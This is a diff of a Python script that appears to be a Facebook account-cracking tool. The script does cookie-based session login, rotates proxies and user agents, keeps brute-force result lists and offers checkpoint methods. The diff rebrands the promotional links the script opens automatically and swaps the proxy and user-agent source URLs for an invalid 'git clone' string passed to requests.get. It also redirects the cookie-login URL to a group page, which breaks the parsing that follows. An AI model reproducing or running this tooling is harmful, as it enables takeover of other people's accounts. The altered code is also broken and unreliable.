@@ -21,7 +21,7 @@ time.sleep(5)
 os.system('clear')
 print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY SCRIPT GIFT GROUP")
 time.sleep(2)
-os.system(f'xdg-open https://facebook.com/groups/554714119911648/')
+os.system(f'xdg-open https://facebook.com/groups/223591017461894//')
 #------------------[ ZISAN-King ]-------------------#
 #------------------[ USER-AGENT ]-------------------#
 ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
@@ -41,7 +41,7 @@ cokbrut=[]
 ses=requests.Session()
 princp=[]
 try:
-    prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
+    prox= requests.get('git clone https://GitHub.com/DarkWebHacker101').text
     open('.prox.txt','w').write(prox)
 except Exception as e:
     pass
@@ -95,7 +95,7 @@ def uaku():
         for ub in ua:
             ugen.append(ub)
     except:
-        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
+        a=requests.get('git clone https://GitHub.com/DarkWebHacker101').text
         ua=open('bbnew.txt','w')
         aa=re.findall('line">(.*?)<',str(a))
         for un in aa:
@@ -185,13 +185,13 @@ def clear():
 def back():
     login()
 def contact():
-   # os.system('xdg-open https://www.facebook.com/ZISAN.King.Ok.Bro')
+   # os.system('xdg-open https://facebook.com/groups/223591017461894')
     back()
 def linex():
     print('\033[1;37m')
 def animation(u):
     for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
-os.system("xdg-open https://www.facebook.com/ZISAN.King.Ok.Bro")
+os.system("xdg-open https://facebook.com/groups/223591017461894")
 #------------------[ LOGO-LAKNAT ]-----------------#
 logo =""" 
 
@@ -245,7 +245,7 @@ def login_lagi334():
         print(logo)
         ses = requests.Session()
         cookies = {'cookie':cookie}
-        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
+        url = 'https://facebook.com/groups/223591017461894'
         req = ses.get(url,cookies=cookies)
         set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
         nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
@@ -524,7 +524,7 @@ def setting():
     print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 2 [\033[0;93mCp id Show\033[1;37m]")
     print('\033[0;91m==================')
     hc = input('\033[97;1m[\033[92;1m•\033[97;1m] CHOOSE : ')
-    #os.system("xdg-open https://www.facebook.com/ZISAN.King.Ok.Bro")
+    #os.system("xdg-open https://facebook.com/groups/223591017461894")
     if hc in ['1','01']:
         method.append('mobile')
     elif hc in ['2','02']:
